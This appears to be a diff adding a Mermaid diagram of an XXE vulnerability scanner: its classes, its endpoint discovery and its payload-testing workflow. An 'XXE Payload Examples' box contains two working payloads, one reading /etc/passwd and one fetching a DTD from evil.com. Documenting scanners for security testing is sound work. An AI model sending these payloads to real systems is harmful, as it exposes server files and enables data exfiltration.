@@ -1,0 +1,76 @@
+graph TD
+    %% Main components definition
+    CoreScanner["Core Scanner<br>Coordinates all scanners"]
+    Target["Target<br>Website with endpoints"]
+    BaseScanner["BaseScanner<br>Abstract scanner class"]
+    XmlScanner["XmlInjectionScanner<br>Specialized for XXE detection"]
+    Endpoint["Endpoints<br>XML processing APIs"]
+    
+    %% Component relationships
+    CoreScanner -->|instantiates| BaseScanner
+    BaseScanner -.->|inherited by| XmlScanner
+    CoreScanner -->|scans| Target
+    Target -->|contains| Endpoint
+    XmlScanner -->|tests with payloads| Endpoint
+    
+    %% Scanning workflow
+    start([Start Scan])
+    initScanners["Initialize Scanners"]
+    createTarget["Create Target from URL"]
+    discoverURLs["Discover XML Endpoints"]
+    runXMLScanner["Run XmlInjectionScanner"]
+    filterXML["Filter XML Endpoints"]
+    prepPayloads["Prepare XXE Payloads"]
+    loopPayloads{"For Each Payload"}
+    sendRequest["Send XML Request"]
+    analyzeResponse["Analyze Response"]
+    logVuln["Log Vulnerability"]
+    collectResults["Collect Results"]
+    endScan([End Scan])
+    
+    start --> initScanners
+    initScanners --> createTarget
+    createTarget --> discoverURLs
+    discoverURLs --> runXMLScanner
+    runXMLScanner --> filterXML
+    filterXML --> prepPayloads
+    prepPayloads --> loopPayloads
+    loopPayloads -->|payload| sendRequest
+    sendRequest --> analyzeResponse
+    analyzeResponse --> logVuln
+    logVuln --> loopPayloads
+    loopPayloads -->|done| collectResults
+    collectResults --> endScan
+    
+    %% XXE Payloads
+    subgraph "XXE Payload Examples"
+        payload1["<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>"]
+        payload2["<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\">%xxe;]>"]
+    end
+    
+    %% Vulnerability detection
+    subgraph "XXE Detection Process"
+        step1["1. Identify XML endpoints with POST methods"]
+        step2["2. Send malicious XXE payloads"]
+        step3["3. Check for file content exposure"]
+        step4["4. Check for error patterns"]
+        step5["5. Create vulnerability reports"]
+        
+        step1 --> step2 --> step3 --> step4 --> step5
+    end
+    
+    %% Styling
+    classDef component fill:#e1d5e7,stroke:#9673a6,stroke-width:2px;
+    classDef process fill:#dae8fc,stroke:#6c8ebf,stroke-width:1px;
+    classDef payload fill:#fff2cc,stroke:#d6b656,stroke-width:1px;
+    classDef detection fill:#f8cecc,stroke:#b85450,stroke-width:1px;
+    classDef endpoint fill:#d5e8d4,stroke:#82b366,stroke-width:1px;
+    classDef control fill:#ffe6cc,stroke:#d79b00,stroke-width:1px;
+    
+    class CoreScanner,BaseScanner,XmlScanner component;
+    class Target,Endpoint endpoint;
+    class start,endScan control;
+    class initScanners,createTarget,discoverURLs,runXMLScanner,filterXML,prepPayloads,sendRequest,analyzeResponse,logVuln,collectResults process;
+    class loopPayloads control;
+    class payload1,payload2 payload;
+    class step1,step2,step3,step4,step5 detection;
